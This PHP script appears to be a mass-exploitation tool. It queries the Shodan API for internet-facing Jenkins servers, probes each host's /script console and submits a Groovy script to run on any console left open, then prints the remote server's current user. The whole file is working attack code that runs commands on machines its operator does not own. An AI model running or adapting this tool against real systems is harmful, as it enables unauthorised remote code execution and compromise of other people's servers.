<?php

require 'jenkins.php';
require 'simple_html_dom.php';
error_reporting(0);

if (!function_exists('curl_init')) {
    echo "\nPHP curl extension is not enabled...\n";
    echo "Windows : https://www.google.co.in/search?q=how+to+enable+php+curl+in+windows\n";
    echo "Lnux : https://www.google.co.in/search?q=how+to+enable+php+curl+in+linux\n";
    echo "MacOS : https://www.google.co.in/search?q=how+to+enable+php+curl+in+mac\n\n";
    exit;
}

$key = "API_KEY";

echo "\nIf your Shodan api key is not upgraded, you can access only 1 page results\n";

$q = urlencode("x-jenkins 200");
$api = "https://api.shodan.io/shodan/host/search?key=$key&query=$q&page=";

for ($page = 1; $page <= 50; $page++) {

    echo "\nMaking Shodan API request for Page = $page\n";
    $data = json_decode(file_get_contents($api . $page), 1);
    echo "Got the response from Shodan\n\n";

    if (!isset($data["matches"])) {
        echo $api . $page . "\n\n";
        echo "<=== Problem with Shodan API. Open above link in browser to see the error ===>\n\n";
        exit;
    }

    echo str_repeat("#", 60) . "\n";
    echo "Starting to analyse the results....\n";
    echo str_repeat("#", 60) . "\n\n";
    $results = $data["matches"];

    foreach ($results as $result) {

        if (!isset($result["ip"])) {
            continue;
        } else {
            $ip = long2ip($result["ip"]);
        }

        $port = $result["port"];
        $url = 'http://' . $ip . ':' . $port . '/script';
        $httpcode = get_http_response_code($url);

        if ($httpcode == 200) {
            echo $httpcode . ' = ' . $url . "\n";
            printUserName($url, $scripts);
        } else {
            // echo $httpcode . ' = ' . $url . "\n\n";
        }
    }
}

function get_http_response_code($url)
{
    $url = urldecode($url);
    $handle = curl_init($url);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5); 
    curl_setopt($handle, CURLOPT_TIMEOUT, 5); //timeout in seconds
    $response = curl_exec($handle);
    $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);
    curl_close($handle);
    return $httpCode;
}

function printUserName($url, $scripts)
{
    $fields = array('script' => urlencode($scripts["user"]), 'Submit' => 'Run');
    $fields_string = "";
    foreach ($fields as $key => $value) {
        $fields_string .= $key . '=' . $value . '&';
    }
    rtrim($fields_string, '&');

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_POST, count($fields));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
    $result = curl_exec($ch);
    curl_close($ch);
    parseResult($result);
}

function parseResult($content) {
    $html = str_get_html($content);
    if(!$html) {
        echo "Current user : Try this one manually!\n\n";
        return;
    }
    $pre = $html->find("pre");
    $preTags = $html->find("pre");
    if(isset($preTags[1]) && strlen($preTags[1]->plaintext) <= 20) {
        echo "Current user : " . trim($preTags[1]->plaintext) . "\n\n";
    } else {
        echo "Current user : Windows probably\n\n";
    }   
}
